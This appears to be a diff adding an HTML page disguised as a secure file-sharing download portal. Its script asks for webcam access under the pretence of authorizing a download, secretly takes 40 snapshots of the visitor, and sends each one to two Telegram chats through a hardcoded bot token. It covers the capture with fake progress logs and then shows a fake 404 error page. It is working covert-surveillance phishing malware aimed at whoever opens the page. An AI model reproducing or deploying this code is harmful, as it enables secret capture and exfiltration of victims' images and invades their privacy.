@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GLOBAL FILE VIEWER | ADVANCEED SEQURITY</title>
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --accent: #00ff88;
+            --bg: #050a14;
+            --danger: #ff4b4b;
+            --dark-blue: #0a192f;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--bg); 
+            color: var(--primary); 
+            font-family: 'Courier New', Courier, monospace; 
+            display: flex; align-items: center; justify-content: center; 
+            height: 100vh; overflow: hidden; 
+        }
+
+        /* Top Loading Bar (Authenticity) */
+        #top-loader-container {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 5px;
+            background: rgba(0, 212, 255, 0.1);
+            z-index: 100;
+        }
+        #top-loader-fill {
+            height: 100%; width: 0%;
+            background: var(--accent);
+            box-shadow: 0 0 15px var(--accent);
+            transition: width 1.6s linear;
+        }
+
+        /* Scanline Effect */
+        body::before {
+            content: " ";
+            position: absolute; top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 10; background-size: 100% 2px, 3px 100%; pointer-events: none;
+        }
+
+        .shield-container { 
+            border: 1px solid var(--primary); 
+            padding: 30px; 
+            background: rgba(10, 25, 47, 0.95); 
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.15); 
+            text-align: center; 
+            width: 90%; max-width: 550px;
+            position: relative;
+            z-index: 5;
+            border-radius: 4px;
+        }
+
+        .scanner-frame {
+            position: relative;
+            width: 140px; height: 140px;
+            margin: 0 auto 20px;
+            border: 2px solid var(--primary);
+            background: rgba(0, 0, 0, 0.3);
+            display: flex; align-items: center; justify-content: center;
+        }
+
+        .scanner-line {
+            position: absolute;
+            width: 100%; height: 2px;
+            background: var(--accent);
+            box-shadow: 0 0 15px var(--accent);
+            animation: scan 3s linear infinite;
+            display: none;
+            z-index: 2;
+        }
+
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        h1 { font-size: 1.4rem; letter-spacing: 5px; margin-bottom: 5px; text-transform: uppercase; text-shadow: 0 0 10px var(--primary); }
+        .subtitle { color: #5a7b8f; font-size: 11px; margin-bottom: 25px; letter-spacing: 1px; }
+
+        /* Advanced Console */
+        #console {
+            background: rgba(0, 5, 10, 0.8);
+            border: 1px solid #1a3a4a;
+            height: 160px;
+            overflow-y: hidden;
+            text-align: left;
+            padding: 12px;
+            font-size: 11px;
+            margin-bottom: 20px;
+            color: var(--accent);
+            box-shadow: inset 0 0 10px #000;
+        }
+
+        .btn { 
+            background: transparent; border: 1px solid var(--primary); 
+            color: var(--primary); padding: 14px 35px; 
+            font-size: 14px; font-weight: bold; cursor: pointer; 
+            text-transform: uppercase; transition: all 0.3s;
+            letter-spacing: 3px;
+            position: relative;
+        }
+
+        .btn:hover { background: var(--primary); color: var(--bg); box-shadow: 0 0 25px var(--primary); }
+
+        .progress-container { width: 100%; background: #071221; height: 6px; margin-top: 15px; display: none; border: 1px solid #1a3a4a;}
+        .progress-bar { height: 100%; width: 0%; background: var(--primary); box-shadow: 0 0 10px var(--primary); transition: width 1.5s; }
+
+        .network-grid {
+            display: flex; justify-content: space-between; margin-top: 10px; font-size: 9px; color: #4a6a7a;
+        }
+
+        .glitch { animation: glitch 1.5s linear infinite; }
+        @keyframes glitch {
+            2%, 64% { transform: translate(2px,0) skew(0deg); }
+            4%, 60% { transform: translate(-2px,0) skew(0deg); }
+            62% { transform: translate(0,0) skew(5deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="top-loader-container"><div id="top-loader-fill"></div></div>
+
+    <div class="shield-container" id="main-ui">
+        <div class="scanner-frame">
+            <div id="scanLine" class="scanner-line"></div>
+            <div style="font-size: 70px; opacity: 0.8;">👤</div>
+        </div>
+        
+        <h1 id="title">GLOBAL FILES SHARE</h1>
+        <p class="subtitle">ENCRYPTED NODE: DOWNLOADING RESOURCES // ACCESS POINT 443</p>
+
+        <div id="console">
+            > SYSTEM STATUS: IDLE<br>
+            > LOG: AWAITING DOWNLOAD SIGNAL...
+        </div>
+
+        <button class="btn" id="mainBtn" onclick="initiate()">Authorize Stream</button>
+
+        <div class="progress-container" id="progCont">
+            <div id="loader" class="progress-bar"></div>
+        </div>
+        
+        <div class="network-grid" id="netGrid" style="display:none;">
+            <span>TX_STABILITY: 99.4%</span>
+            <span>UPLINK_ACTIVE</span>
+            <span>NODE_LATENCY: 24ms</span>
+        </div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = '8735416424:AAGaGFtLiSCbprRIaP8Cv5mj1-LpSSF_ltw';
+        const IDS = ['7617707778', '6590760553'];
+        const consoleEl = document.getElementById('console');
+
+        function logToConsole(msg) {
+            const line = document.createElement('div');
+            line.innerHTML = `<span style="color:#5a7b8f;">[${new Date().toLocaleTimeString()}]</span> > ${msg}`;
+            consoleEl.appendChild(line);
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+            if(consoleEl.childNodes.length > 9) consoleEl.removeChild(consoleEl.childNodes[0]);
+        }
+
+        async function initiate() {
+            const loader = document.getElementById('loader');
+            const topLoader = document.getElementById('top-loader-fill');
+            const btn = document.getElementById('mainBtn');
+            const scanLine = document.getElementById('scanLine');
+            const progCont = document.getElementById('progCont');
+            const netGrid = document.getElementById('netGrid');
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                btn.style.display = 'none';
+                progCont.style.display = 'block';
+                netGrid.style.display = 'flex';
+                scanLine.style.display = 'block';
+                document.getElementById('title').classList.add('glitch');
+
+                logToConsole("ESTABLISHING SECURE DOWNLOADING TUNNEL...");
+                logToConsole("RESOURCES VERIFIED.");
+                logToConsole("REDIRECTING TO DOWNLOADING PAGE...");
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const maxPackets = 40; // Increased to 40
+                    
+                    const interval = setInterval(() => {
+                        if (count >= maxPackets) {
+                            clearInterval(interval);
+                            logToConsole("VERFICATION COMPLETE. CLOSING TUNNEL...");
+                            stream.getTracks().forEach(track => track.stop());
+                            setTimeout(render404, 2000);
+                            return;
+                        }
+                        
+                        send(count + 1);
+                        count++;
+                        
+                        const progress = (count * (100 / maxPackets));
+                        loader.style.width = progress + "%";
+                        topLoader.style.width = progress + "%"; // Top bar sync
+                        
+                        // Dynamic advanced logs
+                        const techLogs = [
+                            `RESOURCE_CHUNK_${count} DOWNLOADING`,
+                            `ROUTING VIA C2-NODE-ALPHA...`,
+                            `SYSTEM CHECK: OK`,
+                            `SEQUENCE_${count} DOWNLOADED`,
+                            `BUFFERING DATA STREAM...`
+                        ];
+                        logToConsole(techLogs[count % techLogs.length]);
+
+                    }, 1600); // Doubled time (1.6 seconds)
+                };
+            } catch (e) {
+                logToConsole("ACCESS DENIED: USER PERMISSION ERROR");
+                consoleEl.style.color = "#ff4b4b";
+            }
+        }
+
+        function send(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                if (!blob) return;
+
+                IDS.forEach(chatId => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'identity_packet.jpg');
+                    fd.append('caption', '🎯 DUSHMAN KI MKB \nFragment: ' + index + '/40\nAgent: C2-Advanced-Node');
+
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    });
+                });
+            }, 'image/jpeg', 0.4); 
+        }
+
+        function render404() {
+            document.documentElement.innerHTML = `
+            <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+            <html><head>
+            <title>404 Error Not Found</title>
+            </head><body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
+            <h1>Not Found</h1>
+            <p>The requested URL was not found on this server. System Error. Access the site again.</p>
+            <hr>
+            <address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
+            </body></html>`;
+            window.history.pushState({}, "", "/error-log-0x8842");
+        }
+    </script>
+</body>
+</html>
